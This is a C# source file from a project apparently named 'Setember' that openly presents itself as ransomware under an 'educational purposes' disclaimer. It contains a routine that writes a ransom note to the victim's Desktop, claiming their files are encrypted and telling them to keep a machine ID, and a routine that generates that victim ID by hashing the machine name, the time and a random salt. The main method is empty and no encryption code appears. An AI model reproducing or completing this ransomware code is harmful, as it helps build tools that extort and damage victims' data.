// 
//   ____ __________ _____ __  __ ____ _____ ____  
//  / ___|___ /_   _|___ /|  \/  | __ )___ /|  _ \ 
//  \___ \ |_ \ | |   |_ \| |\/| |  _ \ |_ \| |_) |
//   ___) |__) || |  ___) | |  | | |_) |__) |  _ < 
//  |____/____/ |_| |____/|_|  |_|____/____/|_| \_\
//                                                 
//
// Copyright (c) 2023 Daniel Aspect
// 
// This file is part of the "Setember" project, licensed under The MIT License.
// 
// THIS SOFTWARE MUST ONLY BE USED FOR EDUCATIONAL PURPOSES!

using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Threading;

namespace Setember;

class Program
{
    protected internal static string MachineId { get; private set; }

    static void Main(string[] args)
    {

    }

    // The path should point to the "Desktop" folder
    // in order for the user to perceive it.
    private static void CreateMessageFile(string filePath)
    {
        string[] text = {
            "DON'T DELETE THIS FILE!",
            @$"MachineId: {MachineId}",
            "---------------------------------------------",
            "Your computer was invaded by a ransomware",
            "and all files were encrypted.",
            "---------------------------------------------",
            "*Note that, if you lose your machine id, you",
            "won't be able to decrypt your files."
        };
        File.WriteAllLines(filePath, text);
    }

    private static void GenerateMachineId()
    {
        byte[] salt = GenerateRandomSalt();
        string[] infos = {
            Environment.MachineName,
            DateTime.Now.ToString(),
            Convert.ToBase64String(salt)
        };

        byte[] hash = SHA512.Create().ComputeHash(
            Encoding.UTF8.GetBytes(string.Join("", infos))
        );

        var machineId = new StringBuilder();

        foreach (byte b in hash)
        {
            // 'X4' formats to a hexadecimal number
            machineId.Append(b.ToString("X4"));
        }

        MachineId = machineId.ToString();
    }

    private static byte[] GenerateRandomSalt()
    {
        byte[] salt = new byte[32];

        using (var rng = RandomNumberGenerator.Create())
        {
            rng.GetBytes(salt);
        }
        return salt;
    }
}
